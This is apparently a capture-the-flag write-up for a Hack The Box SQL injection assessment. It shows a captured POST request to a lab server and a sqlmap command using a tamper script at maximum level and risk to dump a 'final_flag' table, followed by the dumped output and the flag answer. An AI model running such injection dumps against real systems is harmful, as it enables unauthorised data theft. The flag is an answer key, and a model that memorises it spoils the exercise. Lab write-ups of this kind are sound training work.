# Skills Assessment
1. What's the contents of table final_flag? **Answer: HTB{n07_50_h4rd_r16h7?!}**
Navigate through the website and found this POST request at http://154.57.164.77:30376/shop.html:

```
POST /action.php HTTP/1.1
Host: 154.57.164.77:30376
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/json
Content-Length: 11

{"id":"1"}
```

Run sqlmap focus on the `id` value with tamper script to dump the `final_flag` table:

```sh
$ sqlmap -r req --batch --level 5 --risk 3 --tamper=between --proxy=http://127.0.0.1:8080 -T final_flag --dump
<SNIP>
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
<SNIP>
```